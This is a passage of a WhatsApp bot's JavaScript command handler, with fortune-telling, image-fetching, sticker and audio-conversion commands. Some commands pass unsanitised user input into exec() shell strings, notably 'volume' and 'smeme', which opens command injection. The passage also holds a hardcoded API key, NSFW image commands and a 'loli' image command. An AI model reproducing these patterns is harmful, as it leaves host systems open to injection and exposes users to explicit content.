atak.sendMessage(from, { text:`⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`}, {quoted: setQuoted}) 
}
break
case 'peruntungan': {
if (!q) return setReply(`Example : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`) 
let [nama, tgl, bln, thn, untuk] = text.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return setReply(anu.message)
atak.sendMessage(from, { text:`⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`}, {quoted: setQuoted}) 
}
break
case 'weton': case 'wetonjawa': {
if (!q) return setReply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
atak.sendMessage(from, { text:`⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`}, {quoted: setQuoted}) 
}
break
case 'sifat': case 'karakter': {
if (!q) return setReply(`Example : ${prefix + command} Dika, 7, 7, 2005`) 
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
atak.sendMessage(from, { text:`⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`}, {quoted: setQuoted}) 
}
break
case 'keberuntungan': {
if (!q) return setReply(`Example : ${prefix + command} Dika, 7, 7, 2005`) 
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
atak.sendMessage(from, { text:`⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`}, {quoted: setQuoted}) 
}
break
case 'memancing': {
if (!q) return setReply(`Example : ${prefix + command} 12, 1, 2022`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
atak.sendMessage(from, { text:`⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`}, {quoted: setQuoted}) 
}
break
case 'masasubur': {
if (!q) return setReply(`Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`) 
let [tgl, bln, thn, siklus] = text.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return setReply(anu.message)
atak.sendMessage(from, { text:`⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`}, {quoted: setQuoted}) 
}
break
case 'zodiak': case 'zodiac': {
if (!q) return setReply(`Example : ${prefix+ command} 7 7 2005`) 
let zodiak = [
["capricorn", new Date(1970, 0, 1)],
["aquarius", new Date(1970, 0, 20)],
["pisces", new Date(1970, 1, 19)],
["aries", new Date(1970, 2, 21)],
["taurus", new Date(1970, 3, 21)],
["gemini", new Date(1970, 4, 21)],
["cancer", new Date(1970, 5, 22)],
["leo", new Date(1970, 6, 23)],
["virgo", new Date(1970, 7, 23)],
["libra", new Date(1970, 8, 23)],
["scorpio", new Date(1970, 9, 23)],
["sagittarius", new Date(1970, 10, 22)],
["capricorn", new Date(1970, 11, 22)]
].reverse()
function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
let date = new Date(text)
if (date == 'Invalid Date') throw date
let d = new Date()
let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
let zodiac = await getZodiac(birth[1], birth[2])
let anu = await primbon.zodiak(zodiac)
if (anu.status == false) return setReply(anu.message)
atak.sendMessage(from, { text:`⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`}, {quoted: setQuoted}) 
}
break
case 'shio': {
if (!q) return setReply(`Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`) 
let anu = await primbon.shio(text)
if (anu.status == false) return setReply(anu.message)
atak.sendMessage(from, { text:`⭔ *Hasil :* ${anu.message}`}, {quoted: setQuoted}) 
}
break
//================================================================================\\
case 'cogan': 
if (!isRegist) return onlyRegist()
var query = ["cogan hd","cogan indo","cowo ganteng","handsome boy","hot boy","oppa","cowo aesthetic","cogan aesthetic"]
var data = await pinterest(pickRandom(query))
var but = [{buttonId: `${command}`, buttonText: { displayText: "Next Photo" }, type: 1 }]
atak.sendMessage(from, { caption: "Random Cowo Ganteng", image: { url: pickRandom(data.result) }, buttons: but, footer: 'Pencet tombol dibawah untuk foto selanjutnya' }, { quoted: ridho })
break
case 'cecan': 
if (!isRegist) return onlyRegist()
var query = ["cecan hd","cecan indo","cewe cantik", "cewe aesthetic", "cecan aesthetic"]
var data = await pinterest(pickRandom(query))
var but = [{buttonId: `${command}`, buttonText: { displayText: "Next Photo" }, type: 1 }]
atak.sendMessage(from, { caption: "Random Cewe Cantik", image: { url: pickRandom(data.result) }, buttons: but, footer: 'Pencet tombol dibawah untuk foto selanjutnya' }, { quoted: ridho })
break
case 'anime':
if (!isRegist) return onlyRegist()
await fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
imageToBase64(pjr)
.then((response) => {
media =  Buffer.from(response, 'base64');
atak.sendMessage(from,{ image: media,caption:'NIH' },{quoted:ridho})
}
)
.catch((error) => {
console.log(error); 
}
)
});
break
case 'loli': case 'milf': case 'husbu': case 'cosplay': case 'wallml':{
if (!isRegist) return onlyRegist()
let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
let kentir = await getBuffer(wipi)
let teks = "Nih"                                          
let buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}owner`,buttonText:{displayText:'🐤OWNER'},type:1}]                            
atak.sendButImage(from, teks, fake, kentir, buttons, {quoted: ridho})      
}
break
case 'wallpapers':{
if (!isRegist) return onlyRegist()
let link =`https://megayaa.herokuapp.com/api/akaneko/wallpapers`
let atak = await getBuffer(link)     
atak.sendImage(from, atak, "Nih",ridho)
}
break
case 'wallpapermobile':{
if (!isRegist) return onlyRegist()
let link =`https://megayaa.herokuapp.com/api/akaneko/mobileWallpapers`
let atak = await getBuffer(link)     
atak.sendImage(from, atak, "Nih",ridho)
}
break
case 'neko':
case 'waifu':
case 'trap':
case 'blowjob':{
if (!isRegist) return onlyRegist()
let ana = await fetchJson(`https://api.waifu.pics/nsfw/${command}`)
let anu = ana.url
let kentir = await getBuffer(anu)
let teks = "Nih"                                          
let buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]                            
atak.sendButImage(from, teks, fake, kentir, buttons, {quoted: setQuoted})      
}
break 
case 'shinobu':
case 'megumin':
case 'bully':
case 'cuddle':
case 'cry':
case 'hug':
case 'awoo':
case 'kiss':
case 'lick':
case 'pat':
case 'smug':
case 'bonk':
case 'yeet':
case 'blush':
case 'smile':
case 'wave':
case 'highfive':
case 'handhold':
case 'nom':
case 'bite':
case 'glomp':
case 'slap':
case 'kill':
case 'happy':
case 'wink':{
if (!isRegist) return onlyRegist()
let ana = await fetchJson(`https://api.waifu.pics/sfw/${command}`)
let anu = ana.url
let kentir = await getBuffer(anu)
let teks = "Nih"                                          
let buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]                            
atak.sendButImage(from, teks, fake, kentir, buttons, {quoted: setQuoted})      
}
break 
case 'neko2':{
if (!isRegist) return onlyRegist()
let ana = await fetchJson(`https://api.waifu.pics/sfw/neko`)
let anu = ana.url
let kentir = await getBuffer(anu)
let teks = "Nih"                                          
let buttons = [{buttonId: `${prefix}neko2`,buttonText:{displayText: `➡️Next`},type:1}]                            
atak.sendButImage(from, teks, fake, kentir, buttons, {quoted: setQuoted})      
}
break 
case 'waifunime':{
if (!isRegist) return onlyRegist()
let ana = await fetchJson(`https://api.waifu.pics/sfw/waifu`)
let anu = ana.url
let kentir = await getBuffer(anu)
let teks = "Nih"                                          
let buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]                            
atak.sendButImage(from, teks, fake, kentir, buttons, {quoted: setQuoted})      
}
break 
case 'hug2':{
if (!isRegist) return onlyRegist()
let ana = await fetchJson(`https://nekos.life/api/v2/img/hug`)
let anu = ana.url
let kentir = await getBuffer(anu)
let teks = "Nih"                                          
let buttons = [{buttonId: `${prefix}hug2`,buttonText:{displayText: `➡️Next`},type:1}]                            
atak.sendButImage(from, teks, fake, kentir, buttons, {quoted: setQuoted})      
}
break
//================================================================================\\
case 'toimg': {
if (!isRegist) return onlyRegist()
if (!isQuotedSticker) return setReply('Reply stickernya')
onlyWait()
let media = await atak.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply(err)
let buffer = fs.readFileSync(ran)
await atak.sendMessage(from, {caption: "Nih", image: buffer})
fs.unlinkSync(ran)
})
}
break
case 'tomp3':
if (!isRegist) return onlyRegist()
if (isQuotedVideo) {
onlyWait()
let media = await atak.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -vn ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply(`Err: ${err}`)
let buffer453 = fs.readFileSync(ran)
await atak.sendMessage(from, {mimetype: 'audio/mp4', audio: buffer453}, { quoted: ridho })
fs.unlinkSync(ran)
})
} else {
setReply("Reply videonya")
}
break
case 'tomp4':
if (!isRegist) return onlyRegist()
if (isQuotedSticker) {
onlyWait()
let file = await atak.downloadAndSaveMediaMessage(quoted)
let outGif = `./temp/${getRandom('.gif')}`
let outMp4 = `./temp/${getRandom('.mp4')}`
exec(`convert ${file} ${outGif}`, (err) => {
if (err) {
console.log(err)
return setReply(`${err}`)
}
exec(`ffmpeg -i ${outGif} -vf "crop=trunc(iw/2)*2:trunc(ih/2)*2" -b:v 0 -crf 25 -f mp4 -vcodec libx264 -pix_fmt yuv420p ${outMp4}`, async (err) => {
if (err) {
console.log(err)
return setReply(`${err}`)
}      
await atak.sendMessage(from,{video: fs.readFileSync(outMp4), caption: "Nih"},{quoted: ridho})
fs.unlinkSync(outGif)
fs.unlinkSync(outMp4)
fs.unlinkSync(file)
})
}) 
}
break
case 'toptt':
if (!isRegist) return onlyRegist()
if (isQuotedAudio){
onlyWait()
let media = await atak.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply('Gagal mengkonversi audio ke ptt')
let topt = fs.readFileSync(ran)
await atak.sendMessage(from,{audio: topt, mimetype: 'audio/mp4', ptt:true}, {quoted: ridho})
fs.unlinkSync(ran)
})
} else {
setReply("Reply audio")
}
break
case 'togif':
if (!isRegist) return onlyRegist()
if ( isQuotedSticker) {
onlyWait()
let file = await  atak.downloadAndSaveMediaMessage(quoted)
let outGif = `./temp/${getRandom('.gif')}`
let outMp4 = `./temp/${getRandom('.mp4')}`
exec(`convert ${file} ${outGif}`, (err) => {
if (err) {
console.log(err)
return setReply(`${err}`)
}
exec(`ffmpeg -i ${outGif} -vf "crop=trunc(iw/2)*2:trunc(ih/2)*2" -b:v 0 -crf 25 -f mp4 -vcodec libx264 -pix_fmt yuv420p ${outMp4}`, async (err) => {
if (err) {
console.log(err)
return setReply(`${err}`)
}      
await sendGif(fs.readFileSync(outMp4))
fs.unlinkSync(outGif)
fs.unlinkSync(outMp4)
fs.unlinkSync(file)
})
}) 
} else if(isQuotedVideo){
onlyWait()
let outMp4 = getRandom('.mp4')
let file = await atak.downloadAndSaveMediaMessage(quoted)
let atak = await fs.readFileSync(file)
await sendGif(atak)
await fs.unlinkSync(file)
}
break
case 'volume':
if (!isRegist) return onlyRegist()
if (Number(args[0]) >= 11) return setReply("Maksimal volume adalah 10")
if (isQuotedAudio){ 
onlyWait()
let media3 = await atak.downloadAndSaveMediaMessage(quoted)
let rname = getRandom('.mp3')
exec(`ffmpeg -i ${media3} -filter:a "volume=${args[0]}" ${rname}`, async (err, stderr, stdout) => {
if (err) return setReply('Error!')
let jadie = fs.readFileSync(rname)
await atak.sendMessage(from, {audio: jadie, mimetype: 'audio/mp4', ptt: true }, {quoted: ridho})
fs.unlinkSync(rname)
fs.unlinkSync(media3)
}
)
} else {
setReply('Reply audio!')
}
break
case 'hode':
if (!isRegist) return onlyRegist()
if(isQuotedAudio) { 
onlyWait()
let medok = await atak.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${medok} -af atempo=4/3,asetrate=44500*3/4 ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(medok)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
await atak.sendMessage(from, {mimetype: 'audio/mp4', ptt: true, audio: buffer453}, { quoted: ridho })
fs.unlinkSync(ran)
})
} else {
setReply('Reply audionya')
}
break
case 'ghost':
if (!isRegist) return onlyRegist()
if(isQuotedAudio) { 
onlyWait()
let mele = await atak.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${mele} -filter:a "atempo=1.6,asetrate=3486" ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(mele)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
await atak.sendMessage(from, {mimetype: 'audio/mp4', ptt: true, audio: buffer453}, { quoted: ridho })
fs.unlinkSync(ran)
}) 
} else {
setReply('Reply audionya')
}
break
case 'nightcore':
if (!isRegist) return onlyRegist()
if(isQuotedAudio) { 
onlyWait()
let mela = await atak.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${mela} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(mela)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
await atak.sendMessage(from, {mimetype: 'audio/mp4', ptt: true, audio: buffer453}, { quoted: ridho })
fs.unlinkSync(ran)
})
} else {
setReply('Reply audionya')
}
break
case 'tupai':
if (!isRegist) return onlyRegist()
if(isQuotedAudio) { 
onlyWait()
let medoi = await atak.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${medoi} -filter:a "atempo=0.8,asetrate=65100" ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(medoi)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
await atak.sendMessage(from, {mimetype: 'audio/mp4', ptt: true, audio: buffer453}, { quoted: ridho })
fs.unlinkSync(ran)
})
} else {
setReply('Reply audionya')
}
break
case 'imut':
if (!isRegist) return onlyRegist()
if(isQuotedAudio) { 
onlyWait() 
let masa = await atak.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${masa} -af atempo=1/2,asetrate=44500*2/1 ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(masa)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
await atak.sendMessage(from, {mimetype: 'audio/mp4', ptt: true, audio: buffer453}, { quoted: ridho })
fs.unlinkSync(ran)
})
} else {
setReply('Reply audionya')
}
break
//================================================================================\\
case 'emojimix': {
if (!isRegist) return onlyRegist()
let [emoji1, emoji2] = q.split`+`
if (!emoji1) return setReply( `Example : ${prefix + command} 😅+🤔`)
if (!emoji2) return setReply( `Example : ${prefix + command} 😅+🤔`)
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
await atak.sendImageAsSticker(from, res.url, ridho)
}
}
break
case 'emojiap':{
if (!isRegist) return onlyRegist()
if (!q) return setReply('emojinya?')
setReply("Converting to emoji Apple")
emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[0].url}`
atak.sendImageAsSticker(from, teks, ridho)
})
}
break	            
case 'emojigo':{
if (!isRegist) return onlyRegist()
if (!q) return setReply('emojinya?')
setReply("Converting to emoji Google")
emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[1].url}`
atak.sendImageAsSticker(from, teks, ridho)
})
}
break	             
case 'emojisa':{
if (!isRegist) return onlyRegist()
if (!q) return setReply('emojinya?')
setReply("Converting to emoji Samsung")
emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[2].url}`
atak.sendImageAsSticker(from, teks, ridho)
})
}
break	             
case 'emojims':{
if (!isRegist) return onlyRegist()
if (!q) return setReply('emojinya?')
setReply("Converting to emoji Microsoft")
emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[3].url}`
atak.sendImageAsSticker(from, teks, ridho)
})
}
break	             
case 'emojiwa':{
if (!isRegist) return onlyRegist()
if (!q) return setReply('emojinya?')
setReply("Converting to emoji WhatsApp")
emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[4].url}`
atak.sendImageAsSticker(from, teks, ridho)
})
}
break	
case 'emojitw':{
if (!isRegist) return onlyRegist()
if (!q) return setReply('emojinya?')
setReply("Converting to emoji Twitter")
emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[5].url}`
atak.sendImageAsSticker(from, teks, ridho)
})
}
break	
case 'emojifb':{
if (!isRegist) return onlyRegist()
if (!q) return setReply('emojinya?')
setReply("Converting to emoji Facebook")
emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[6].url}`
atak.sendImageAsSticker(from, teks, ridho)
})
}
break	
case 'emojijp':{
if (!isRegist) return onlyRegist()
if (!q) return setReply('emojinya?')
await setReply("Converting to emoji joypixel")
await emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[7].url}`
atak.sendImageAsSticker(from, teks, ridho)
})
}
break	       
case 'emojiom':{
if (!isRegist) return onlyRegist()
if (!q) return setReply('emojinya?')
await setReply("Converting to emoji openmoji")
await emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[8].url}`
atak.sendImageAsSticker(from, teks, ridho)
})
}
break	      
case 'emojied':{
if (!isRegist) return onlyRegist()
if (!q) return setReply('emojinya?')
await setReply("Converting to emoji emojidex")
await emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[9].url}`
atak.sendImageAsSticker(from, teks, ridho)
})
}
break	      
case 'emojimes':{
if (!isRegist) return onlyRegist()
if (!q) return setReply('emojinya?')
await setReply("Converting to emoji messenger")
await emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[10].url}`
atak.sendImageAsSticker(from, teks, ridho)
})
}
break
case 'emojilt':{
if (!isRegist) return onlyRegist()
if (!q) return setReply('emojinya?')
await setReply("Converting to emoji logitech")
await emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[11].url}`
atak.sendImageAsSticker(from, teks, ridho)
})
}
break
case 'emojimo':{
if (!isRegist) return onlyRegist()
if (!q) return setReply('emojinya?')
await setReply("Converting to emoji mozila")
await emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[13].url}`
atak.sendImageAsSticker(from, teks, ridho)
})
}
break
//================================================================================\\
case 'sticker':  case 's':
if (!isRegist) return onlyRegist()
if (isImage || isQuotedImage) {
try{
let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
let media = await atak.downloadAndSaveMediaMessage(quoted)
let jancok = new Sticker(media, {
pack: packName, // The pack name
author: authorName, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await atak.sendMessage(from,{sticker: nah},{quoted: ridho})
await fs.unlinkSync(stok)
await fs.unlinkSync(media)
} catch (err){
if(err){ return}
var stream = await downloadContentFromMessage(ridho.message.imageMessage || ridho.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
var buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
var rand1 = 'sticker/'+getRandom('.jpg')
var rand2 = 'sticker/'+getRandom('.webp')
fs.writeFileSync(`./${rand1}`, buffer)
ffmpeg(`./${rand1}`)
.on("error", console.error)
.on("end", () => {
exec(`webpmux -set exif ./media/sticker/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
await atak.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: ridho })
await fs.unlinkSync(`./${rand1}`)
await fs.unlinkSync(`./${rand2}`)
})
})
.addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
.toFormat('webp')
.save(`${rand2}`)
}
} else if (isVideo || isQuotedVideo) {
try{
let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
let media = await atak.downloadAndSaveMediaMessage(quoted)
let jancok = new Sticker(media, {
pack: packName, // The pack name
author: authorName, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 1, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await atak.sendMessage(from,{sticker: nah},{quoted: ridho})
await fs.unlinkSync(stok)
await fs.unlinkSync(media)
} catch (err){
var stream = await downloadContentFromMessage(ridho.message.imageMessage || ridho.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage, 'video')
var buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
var rand1 = 'sticker/'+getRandom('.mp4')
var rand2 = 'sticker/'+getRandom('.webp')
fs.writeFileSync(`./${rand1}`, buffer)
ffmpeg(`./${rand1}`)
.on("error", console.error)
.on("end", () => {
exec(`webpmux -set exif ./media/sticker/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
await atak.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: ridho })
await fs.unlinkSync(`./${rand1}`)
await s.unlinkSync(`./${rand2}`)
})
})
.addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
.toFormat('webp')
.save(`${rand2}`)
}
} else {
setReply(`Kirim gambar/vidio dengan caption ${command} atau balas gambar/vidio yang sudah dikirim\nNote : Maximal vidio 10 detik!`)
}
break
case 'attp':
if (!isRegist) return onlyRegist()
try {
if (args.length == 0) return setReply(`Example: ${prefix + command} ${ownerName}`)
await atak.sendMessage(from, {sticker: {url:`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}` }}, { quoted: ridho })
} catch (e) {
console.log(e)
setReply(`Maap sedang error coba lagi besok`)            
}
break
case 'smeme': {
if (!isRegist) return onlyRegist()
if(!q) return setReply(`Masukan teks, contoh : ${prefix}smeme teks|teks`)
var top = q.split('|')[0] ? q.split('|')[0] : ''
var bottom = q.split('|')[1] ? q.split('|')[1] : ''           
if (isQuotedImage ) {
onlyWait()
try{
let { Sticker, StickerTypes } = require('wa-sticker-formatter')
let olalah = await atak.downloadAndSaveMediaMessage(quoted)
let anuah = await TelegraPh(olalah)
let media = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${anuah}`
await makeSticker(media,Sticker, StickerTypes)
await fs.unlinkSync(olalah)
} catch (err){
let olalah = await atak.downloadAndSaveMediaMessage(quoted)
let anuah = await TelegraPh(olalah)
let ranp = getRandom('.gif')
let rano = getRandom('.webp')
let anu2 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${anuah}`
exec(`wget ${anu2} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, async (err) => {
if (err) return setReply(`${err}`)
await atak.sendMessage(from,{sticker: fs.readFileSync(rano)}, {quoted: ridho})
await fs.unlinkSync(rano)
await fs.unlinkSync(ranp)
})
}
} else {
setReply('Gunakan foto!')
}
}
break
case 'triggered':
case 'wasted':
case 'comrade':
case 'horny':
case 'blur':
case 'pixelate':
case 'simpcard':
case 'lolice':
case 'glass':
if (!isRegist) return onlyRegist()
if (isQuotedVideo && ridho.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage.fileLength < 10000000 || isQuotedImage || isImage) {
onlyWait()
try{
let { Sticker, StickerTypes } = require('wa-sticker-formatter')
let olalah = await atak.downloadAndSaveMediaMessage(quoted)
let anuah = await TelegraPh(olalah)
let media = `https://some-random-api.ml/canvas/${command}?avatar=${anuah}`
await makeSticker(media,Sticker, StickerTypes)
await fs.unlinkSync(olalah)
} catch (err){  
let owgi = await atak.downloadAndSaveMediaMessage(quoted)
let anu = await TelegraPh(owgi)
let ranp = getRandom('.gif')
let rano = getRandom('.webp')
let anu4 = `https://some-random-api.ml/canvas/${command}?avatar=${anu}`
exec(`wget ${anu4} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, async (err) => {
if (err) return setReply(`${err}`)
await atak.sendMessage(from, {sticker: fs.readFileSync(rano)}, {quoted: ridho})
await fs.unlinkSync(owgi)
await fs.unlinkSync(ranp)
await fs.unlinkSync(rano)
})
}
} else if (isQuotedText) {
onlyWait()
try{
let { Sticker, StickerTypes } = require('wa-sticker-formatter')
let olalah = await atak.profilePictureUrl(mentionByReply, 'image').catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png') 
let media = `https://some-random-api.ml/canvas/${command}?avatar=${olalah}`
await makeSticker(media,Sticker, StickerTypes)
await fs.unlinkSync(olalah)
} catch (err){  
console.log(err)
let oppp = await atak.profilePictureUrl(mentionByReply, 'image').catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
let anu4 = `https://some-random-api.ml/canvas/${command}?avatar=${oppp}`
let ranp = getRandom('.gif')
let rano = getRandom('.webp')
exec(`wget ${anu4} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, async (err) => {
if (err) return setReply(`${err}`)
await atak.sendMessage(from, {sticker: fs.readFileSync(rano)}, {quoted: ridho})
await fs.unlinkSync(oppp)
await fs.unlinkSync(ranp)
await fs.unlinkSync(rano)
})
}
}  else {
setReply('Gunakan foto!')
}
break
case 'take':
if (!isRegist) return onlyRegist()
if (isImage || isQuotedImage|| isQuotedSticker) {
try{
let ahuh = args.join(' ').split('|')
let satu = ahuh[0] !== '' ? ahuh[0] : `${pushname}`
let dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : ``
let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
let media = await atak.downloadAndSaveMediaMessage(quoted)
let jancok = new Sticker(media, {
pack: satu, // The pack name
author: dua, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await atak.sendMessage(from,{sticker: nah},{quoted: ridho})
await fs.unlinkSync(stok)
await fs.unlinkSync(media)
} catch (err){
console.log(err)
}
}
break
case 'patrick':
if (!isRegist) return onlyRegist()
